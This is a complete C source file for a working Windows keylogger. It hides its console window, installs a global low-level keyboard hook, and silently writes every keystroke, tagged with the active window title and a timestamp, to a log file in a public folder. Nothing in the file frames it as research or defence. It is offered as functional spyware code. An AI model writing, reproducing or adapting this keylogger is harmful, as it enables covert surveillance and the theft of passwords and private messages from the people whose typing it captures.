#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <string.h>

#define LOG_FILE "C:\\Users\\Public\\keylogs.txt"

HHOOK hook;
char lastWindowTitle[256] = "";

// Function to log the current active window and timestamp
void LogWindowContext() {
    HWND foreground = GetForegroundWindow();
    char currentTitle[256];

    if (foreground) {
        GetWindowTextA(foreground, currentTitle, sizeof(currentTitle));

        // Only log if the window has changed
        if (strcmp(currentTitle, lastWindowTitle) != 0) {
            strcpy(lastWindowTitle, currentTitle);

            FILE *file = fopen(LOG_FILE, "a");
            if (file) {
                time_t now = time(NULL);
                struct tm *t = localtime(&now);

                fprintf(file,
                        "\n\n[%02d-%02d-%04d %02d:%02d:%02d] App: %s\n",
                        t->tm_mday,
                        t->tm_mon + 1,
                        t->tm_year + 1900,
                        t->tm_hour,
                        t->tm_min,
                        t->tm_sec,
                        currentTitle);

                fclose(file);
            }
        }
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        LogWindowContext(); // Check context before logging key

        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
        FILE *logFile = fopen(LOG_FILE, "a");
        if (!logFile) return CallNextHookEx(hook, nCode, wParam, lParam);

        switch (kb->vkCode) {
            case VK_RETURN:  fprintf(logFile, "[ENTER]\n"); break;
            case VK_SPACE:   fprintf(logFile, " "); break;
            case VK_BACK:    fprintf(logFile, "[BKSP]"); break;
            case VK_TAB:     fprintf(logFile, "[TAB]"); break;
            case VK_CAPITAL: fprintf(logFile, "[CAPS]"); break;
            case VK_ESCAPE:  fprintf(logFile, "[ESC]"); break;

            default: {
                BYTE keyState[256];
                GetKeyboardState(keyState);
                WORD ascii;

                if (ToAscii(kb->vkCode, kb->scanCode, keyState, &ascii, 0) == 1) {
                    fprintf(logFile, "%c", (char)ascii);
                }
                break;
            }
        }

        fclose(logFile);
    }

    return CallNextHookEx(hook, nCode, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {

    // Hide console window
    HWND stealth = GetConsoleWindow();
    ShowWindow(stealth, SW_HIDE);

    // Set keyboard hook
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    return 0;
}
